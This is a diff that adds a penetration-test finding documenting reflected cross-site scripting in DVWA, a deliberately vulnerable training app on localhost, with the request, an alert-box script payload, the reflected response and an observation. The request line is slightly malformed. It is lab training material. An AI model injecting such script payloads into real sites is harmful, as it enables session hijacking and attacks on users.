@@ -1,0 +1,43 @@
+========================================================
+FINDING F-02 — Reflected Cross-Site Scripting (XSS)
+Target: DVWA | Module: XSS (Reflected) | Security Level: Low
+========================================================
+
+--- REQUEST ---
+
+GET /vulnerabilities/xss_r// name=3Cscript%3Ealert('XSS')%3C%2Fscript%3E HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID=<your-session-id>; security=low
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+(Plain form equivalent — what you typed into the DVWA "What's your name?" input box)
+Input Field Value: <script>alert('XSS')</script>
+
+--- RESPONSE (what DVWA returned) ---
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+...
+<pre>Hello <script>alert('XSS')</script></pre>
+...
+
+The browser executed the script tag immediately upon rendering the page.
+A JavaScript alert dialog appeared in the browser with the message: XSS
+
+--- OBSERVATION ---
+
+The application reflected the raw user input directly back into the
+HTML response body without encoding or escaping any characters.
+The browser interpreted the <script> tag as executable JavaScript
+rather than display text, causing the alert to fire.
+
+This confirms a live Reflected XSS vulnerability. Any payload placed
+in the name parameter is executed in the victim's browser context.
+
+========================================================
+Tool used: Browser (Firefox) — DVWA built-in input form
+Date: 27 March 2026
+Tester: Indrajit Singh
+========================================================
